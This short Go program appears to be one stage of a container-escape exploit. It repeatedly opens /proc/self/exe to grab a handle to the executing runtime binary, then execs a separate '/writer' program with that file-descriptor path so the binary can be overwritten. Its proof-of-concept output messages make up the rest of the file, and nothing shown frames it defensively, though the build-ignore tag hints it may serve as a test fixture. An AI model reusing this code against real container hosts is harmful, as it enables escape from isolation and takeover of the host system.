//go:build ignore
// +build ignore

package main

import (
	"fmt"
	"os"
	"syscall"
)

func main() {
	fmt.Println("ld")
	handleFd := -1
	for handleFd == -1 {
		handleFd, _ = syscall.Open("/proc/self/exe", syscall.O_RDONLY, 0o777)
	}
	fmt.Printf("[+] Successfully got the file handle %d\n", handleFd)
	args := []string{"/writer", fmt.Sprintf("/proc/self/fd/%d", handleFd)}
	if err := syscall.Exec("/writer", args, os.Environ()); err != nil {
		fmt.Printf("[-] Exec error: %v\n", err)
	}
}
